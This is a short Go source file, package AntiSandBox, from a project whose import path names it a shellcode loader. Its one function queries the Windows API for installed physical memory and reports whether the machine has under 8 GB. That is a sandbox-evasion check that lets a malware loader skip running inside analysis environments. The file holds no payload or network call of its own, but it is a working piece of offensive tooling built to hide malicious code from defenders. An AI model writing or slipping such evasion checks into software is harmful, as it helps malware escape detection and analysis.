package AntiSandBox

import (
	"GoShellCodeLoader/API"
	"unsafe"
)

func GetPhysicalMemory() (int, error) {
	api, _ := API.SetWindowsAPI()

	var proc = api.Kernel32.NewProc("GetPhysicallyInstalledSystemMemory")

	var memory uint64
	_, _, _ = proc.Call(uintptr(unsafe.Pointer(&memory)))

	memory = memory / 1048576
	if memory < 8 {
		return 0, nil
	}
	return 1, nil
}
